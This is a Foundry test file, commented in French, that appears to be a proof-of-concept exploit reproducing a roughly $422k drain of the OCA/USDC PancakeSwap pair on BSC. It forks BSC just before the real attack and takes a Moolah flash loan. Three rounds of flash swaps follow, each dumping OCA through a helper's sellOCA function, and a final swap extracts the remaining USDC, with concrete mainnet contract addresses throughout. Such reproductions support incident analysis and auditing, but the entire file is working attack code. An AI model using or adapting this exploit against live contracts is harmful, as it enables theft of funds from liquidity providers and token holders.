// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
}

interface IPancakePair {
    function getReserves() external view returns (uint112, uint112, uint32);
    function swap(uint256, uint256, address, bytes calldata) external;
}

interface IPancakeRouter {
    function getAmountsOut(uint256, address[] calldata) external view returns (uint256[] memory);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256, uint256, address[] calldata, address, uint256
    ) external;
}

interface ISwapHelper {
    function sellOCA(uint256 amount) external;
}

interface IMoolah {
    function flashLoan(address token, uint256 amount, bytes calldata data) external;
}

contract OCAExploitPoC is Test {
    address constant USDC   = 0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d;
    address constant OCA    = 0xE0dAFD4592205067299A6ae269f68aa804f95419;
    address constant PAIR   = 0x5779bf44CD518B05651AE38fCc066247cCe21504;
    address constant ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address constant MOOLAH = 0x8F73b65B4caAf64FBA2aF91cC5D4a2A1318E5D8C;
    address constant HELPER = 0xE0D5eC0F754c442F37fbdf18266053309D5F6f55;

    uint256 usdcToPayPair;  // state var for pancakeCall
    uint256 keepOca;        // OCA to accumulate for the final swap

    function setUp() public {
        // Fork BSC au bloc AVANT la vraie attaque (~$427k dans la paire)
        vm.createSelectFork("https://rpc.sentio.xyz/bsc", 81020477);
    }

    function testOCAExploit() public {
        emit log("============================================================");
        emit log("  OCA TOKEN EXPLOIT PoC - BSC - Block 81020478");
        emit log("  Reproducing the ~$422k drain");
        emit log("============================================================");

        _logPairState("ETAT INITIAL DE LA PAIRE");
        emit log_named_decimal_uint("Moolah USDC disponible",
            IERC20(USDC).balanceOf(MOOLAH), 18);

        // Flash loan : emprunter TOUT l'USDC de Moolah
        uint256 flashAmount = IERC20(USDC).balanceOf(MOOLAH);
        IERC20(USDC).approve(MOOLAH, flashAmount);

        uint256 usdcBefore = IERC20(USDC).balanceOf(address(this));

        IMoolah(MOOLAH).flashLoan(USDC, flashAmount, "");

        uint256 usdcAfter = IERC20(USDC).balanceOf(address(this));

        emit log("");
        emit log("============================================================");
        emit log("  RESULTAT FINAL");
        emit log("============================================================");
        _logPairState("ETAT FINAL DE LA PAIRE");
        emit log_named_decimal_uint("USDC avant attaque", usdcBefore, 18);
        emit log_named_decimal_uint("USDC apres attaque", usdcAfter, 18);
        emit log_named_decimal_uint(">>> PROFIT TOTAL", usdcAfter - usdcBefore, 18);

        assertGt(usdcAfter, usdcBefore, "Exploit should be profitable");
    }

    // ================================================================
    //  Moolah flash loan callback
    // ================================================================
    function onMoolahFlashLoan(uint256 amount, bytes calldata) external {
        emit log("");
        emit log_named_decimal_uint("[FLASH LOAN] USDC emprunte", amount, 18);

        IERC20(OCA).approve(HELPER, type(uint256).max);

        address[] memory pathUsdcToOca = new address[](2);
        pathUsdcToOca[0] = USDC;
        pathUsdcToOca[1] = OCA;

        // ============================================================
        //  ROUND 1 : Flash swap → sellOCA (garde 1% pour le swap final)
        // ============================================================
        {
            uint256 curUsdc = IERC20(USDC).balanceOf(address(this));
            uint256[] memory amts = IPancakeRouter(ROUTER).getAmountsOut(curUsdc, pathUsdcToOca);

            emit log("");
            emit log("[ROUND 1] Flash swap + sellOCA");
            emit log_named_decimal_uint("  USDC envoye a la paire", curUsdc, 18);
            emit log_named_decimal_uint("  OCA attendu", amts[1], 18);

            usdcToPayPair = curUsdc;
            IPancakePair(PAIR).swap(0, amts[1], address(this), abi.encode(uint256(1)));

            uint256 ocaBal = IERC20(OCA).balanceOf(address(this));
            keepOca = ocaBal / 100;  // garder 1% pour le swap final
            uint256 sellAmount = ocaBal - keepOca;

            emit log_named_decimal_uint("  OCA recu", ocaBal, 18);
            emit log_named_decimal_uint("  OCA garde pour final", keepOca, 18);
            emit log_named_decimal_uint("  OCA vendu via sellOCA", sellAmount, 18);

            ISwapHelper(HELPER).sellOCA(sellAmount);

            emit log_named_decimal_uint("  USDC recupere", IERC20(USDC).balanceOf(address(this)), 18);
            _logPairState("  Paire apres Round 1");
        }

        // ============================================================
        //  ROUND 2 : Flash swap → sellOCA
        // ============================================================
        {
            uint256 curUsdc = IERC20(USDC).balanceOf(address(this));
            uint256[] memory amts = IPancakeRouter(ROUTER).getAmountsOut(curUsdc, pathUsdcToOca);

            emit log("");
            emit log("[ROUND 2] Flash swap + sellOCA");

            usdcToPayPair = curUsdc;
            IPancakePair(PAIR).swap(0, amts[1], address(this), abi.encode(uint256(1)));

            // Vendre seulement les OCA fraichement reçus (pas les keepOca)
            uint256 ocaBal = IERC20(OCA).balanceOf(address(this));
            uint256 sellAmount = ocaBal - keepOca;

            emit log_named_decimal_uint("  OCA recu (nouveau)", sellAmount, 18);

            ISwapHelper(HELPER).sellOCA(sellAmount);

            emit log_named_decimal_uint("  USDC recupere", IERC20(USDC).balanceOf(address(this)), 18);
            _logPairState("  Paire apres Round 2");
        }

        // ============================================================
        //  ROUND 3 : Flash swap → sellOCA
        // ============================================================
        {
            uint256 curUsdc = IERC20(USDC).balanceOf(address(this));
            uint256[] memory amts = IPancakeRouter(ROUTER).getAmountsOut(curUsdc, pathUsdcToOca);

            emit log("");
            emit log("[ROUND 3] Flash swap + sellOCA");

            usdcToPayPair = curUsdc;
            IPancakePair(PAIR).swap(0, amts[1], address(this), abi.encode(uint256(1)));

            uint256 ocaBal = IERC20(OCA).balanceOf(address(this));
            uint256 sellAmount = ocaBal - keepOca;

            emit log_named_decimal_uint("  OCA recu (nouveau)", sellAmount, 18);

            ISwapHelper(HELPER).sellOCA(sellAmount);

            emit log_named_decimal_uint("  USDC recupere", IERC20(USDC).balanceOf(address(this)), 18);
            _logPairState("  Paire apres Round 3");
        }

        // ============================================================
        //  SWAP FINAL : Vendre les OCA gardés pour extraire le USDC restant
        // ============================================================
        {
            uint256 remainingOca = IERC20(OCA).balanceOf(address(this));
            // Garder 0.001 OCA minimum requis par le token
            uint256 swapAmount = remainingOca - 1e15;

            emit log("");
            emit log("[SWAP FINAL] Vente des OCA accumules");
            emit log_named_decimal_uint("  OCA a vendre", swapAmount, 18);

            IERC20(OCA).approve(ROUTER, swapAmount);

            address[] memory pathOcaToUsdc = new address[](2);
            pathOcaToUsdc[0] = OCA;
            pathOcaToUsdc[1] = USDC;

            uint256 usdcPre = IERC20(USDC).balanceOf(address(this));
            IPancakeRouter(ROUTER).swapExactTokensForTokensSupportingFeeOnTransferTokens(
                swapAmount, 0, pathOcaToUsdc, address(this), block.timestamp + 1000
            );
            uint256 usdcGained = IERC20(USDC).balanceOf(address(this)) - usdcPre;

            emit log_named_decimal_uint("  USDC du swap final", usdcGained, 18);
        }

        // ============================================================
        //  Bilan avant remboursement
        // ============================================================
        emit log("");
        emit log_named_decimal_uint("[BILAN] USDC total", IERC20(USDC).balanceOf(address(this)), 18);
        emit log_named_decimal_uint("[BILAN] Flash loan a rembourser", amount, 18);
        emit log_named_decimal_uint("[BILAN] Surplus (profit brut)",
            IERC20(USDC).balanceOf(address(this)) - amount, 18);

        // Moolah fera transferFrom pour récupérer le flash loan
    }

    // ================================================================
    //  PancakeSwap flash swap callback
    // ================================================================
    function pancakeCall(address, uint256, uint256, bytes calldata) external {
        IERC20(USDC).transfer(PAIR, usdcToPayPair);
    }

    // ================================================================
    //  Helper : afficher l'état de la paire
    // ================================================================
    function _logPairState(string memory label) internal {
        (uint112 r0, uint112 r1,) = IPancakePair(PAIR).getReserves();
        emit log(string.concat("  [", label, "]"));
        emit log_named_decimal_uint("    Paire USDC", uint256(r0), 18);
        emit log_named_decimal_uint("    Paire OCA ", uint256(r1), 18);
    }

    receive() external payable {}
}
